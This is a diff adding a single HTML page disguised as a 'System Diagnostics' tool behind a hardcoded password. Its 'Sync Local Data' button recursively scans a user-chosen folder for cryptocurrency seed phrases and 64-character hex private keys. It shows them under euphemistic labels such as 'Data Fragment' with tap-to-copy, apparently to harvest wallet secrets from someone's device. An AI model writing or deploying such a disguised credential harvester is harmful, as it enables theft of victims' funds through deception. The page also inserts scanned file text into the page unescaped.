@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="manifest" href="manifest.json">
+    <title>System Diagnostics</title>
+    <style>
+        :root { --bg: #f0f2f5; --card: #ffffff; --text: #1c1e21; --accent: #0064e0; --border: #ccd0d5; --success: #42b72a; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
+        body, html { background: var(--bg); color: var(--text); font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; height: 100vh; width: 100vw; overflow: hidden; position: fixed; }
+
+        /* SECURITY GATE */
+        #gate { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
+        #idKey { width: 100%; max-width: 300px; padding: 15px; border: 1px solid var(--border); border-radius: 8px; font-size: 1.2rem; text-align: center; outline: none; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+
+        /* CORE HUD */
+        #app-core { display: none; height: 100vh; flex-direction: column; }
+        header { padding: 15px 20px; background: #fff; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.03); }
+        header h1 { font-size: 16px; font-weight: 600; color: #444; }
+        #status-pill { font-size: 11px; background: #e7f3ff; color: var(--accent); padding: 4px 10px; border-radius: 20px; font-weight: 700; }
+
+        /* RESULTS AREA */
+        #explorer { flex: 1; overflow-y: auto; padding: 15px; padding-bottom: 120px; }
+        .data-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 16px; margin-bottom: 12px; position: relative; transition: transform 0.1s; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        .data-card:active { transform: scale(0.98); background: #f9f9f9; }
+        .type-label { font-size: 10px; font-weight: 800; color: #8d949e; text-transform: uppercase; margin-bottom: 8px; display: block; }
+        code { display: block; background: #f5f6f7; padding: 12px; border-radius: 6px; border: 1px solid #ebedf0; font-family: "SF Mono", monospace; font-size: 14px; color: #050505; word-break: break-all; }
+        .copy-hint { font-size: 10px; color: var(--success); margin-top: 8px; font-weight: 600; text-align: right; }
+
+        /* ERGONOMIC BUTTON */
+        .action-bar { position: fixed; bottom: 0; width: 100%; padding: 20px; background: linear-gradient(transparent, var(--bg) 20%); }
+        #igniteBtn { width: 100%; height: 56px; background: var(--accent); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 100, 224, 0.3); }
+    </style>
+</head>
+<body>
+
+<div id="gate"><input type="password" id="idKey" placeholder="Verify Identity" autofocus></div>
+
+<div id="app-core">
+    <header>
+        <h1>System Analyzer</h1>
+        <div id="status-pill">READY</div>
+    </header>
+
+    <div id="explorer">
+        </div>
+
+    <div class="action-bar">
+        <button id="igniteBtn">Sync Local Data</button>
+    </div>
+</div>
+
+<script>
+    const MASTER = "7542017646";
+    const status = document.getElementById('status-pill'), explorer = document.getElementById('explorer'), btn = document.getElementById('igniteBtn');
+
+    // Auto-login logic
+    document.getElementById('idKey').oninput = (e) => {
+        if (e.target.value === MASTER) {
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('app-core').style.display = 'flex';
+            if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(()=>{});
+        }
+    };
+
+    // The Bridge
+    btn.onclick = async () => {
+        try {
+            const h = await window.showDirectoryPicker();
+            status.innerText = "SCANNING";
+            status.style.background = "#fff3cd";
+            status.style.color = "#856404";
+            await deepScrub(h);
+            status.innerText = "COMPLETE";
+            status.style.background = "#d4edda";
+            status.style.color = "#155724";
+        } catch (e) {
+            status.innerText = "ERR: PERM_BLOCK";
+        }
+    };
+
+    async function deepScrub(h) {
+        for await (const entry of h.values()) {
+            if (entry.kind === 'file') {
+                const f = await entry.getFile();
+                if (f.size < 600000 && !f.name.match(/\.(png|jpg|mp4|zip|pdf)$/i)) {
+                    try {
+                        const text = await f.text();
+                        const seeds = text.match(/\b([a-z]{3,}\s){11,23}[a-z]{3,}\b/gi);
+                        const keys = text.match(/\b(0x)?[a-fA-F0-9]{64}\b/gi);
+                        if (seeds) seeds.forEach(s => render(s, "Mnemonic Set"));
+                        if (keys) keys.forEach(k => render(k, "Data Fragment"));
+                    } catch(err) {}
+                }
+            } else if (entry.kind === 'directory') {
+                await new Promise(r => setTimeout(r, 15));
+                await deepScrub(entry);
+            }
+        }
+    }
+
+    function render(val, type) {
+        const card = document.createElement('div');
+        card.className = 'data-card';
+        card.innerHTML = `
+            <span class="type-label">${type}</span>
+            <code>${val}</code>
+            <div class="copy-hint">TAP TO COPY</div>
+        `;
+        card.onclick = () => {
+            navigator.clipboard.writeText(val);
+            navigator.vibrate?.(60);
+            const original = card.innerHTML;
+            card.style.borderColor = "var(--success)";
+            setTimeout(() => card.style.borderColor = "var(--border)", 1000);
+        };
+        explorer.prepend(card);
+        navigator.vibrate?.([50, 30, 50]);
+    }
+</script>
+</body>
+</html>
